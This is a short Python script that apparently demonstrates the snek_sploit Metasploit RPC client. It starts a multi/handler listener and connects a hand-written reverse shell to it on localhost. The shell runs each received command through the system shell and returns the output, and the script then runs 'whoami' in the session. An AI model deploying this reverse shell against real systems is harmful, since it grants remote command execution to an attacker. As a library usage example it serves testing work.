# This script will start a reverse shell on the localhost

import time
import subprocess
import socket
import threading

from snek_sploit import Client, ModuleType, SessionInformation


def create_connection(target, port=4444):
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.connect((target, port))
    while True:
        d = so.recv(1024)
        if len(d) == 0:
            break
        p = subprocess.Popen(d, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        o = p.stdout.read() + p.stderr.read()
        so.send(o)


if __name__ == '__main__':
    client = Client("msf", "root", disable_https_warnings=True)

    print("Starting MSF listener... ", end="")
    execution = client.modules.rpc.execute(
        ModuleType.exploit,
        "multi/handler",
        {"PAYLOAD": "python/shell_reverse_tcp", "LHOST": "0.0.0.0", "LPORT": 4444}
    )
    print("OK")

    threading.Thread(target=create_connection, args=("localhost",)).start()

    print("Establishing connection to the listener... ", end="")
    session_to_match = SessionInformation(exploit_uuid=execution.uuid)
    while (sessions := client.sessions.filter(session_to_match)) is None:
        time.sleep(1)
    print("OK")
    session_id = list(sessions.keys())[-1]
    shell = client.sessions.get(session_id)
    print(f"Executing command `whoami` in the session {session_id}... ")
    shell.write('whoami')
    time.sleep(3)
    print(f"Result: {shell.read()}")
    shell.kill()
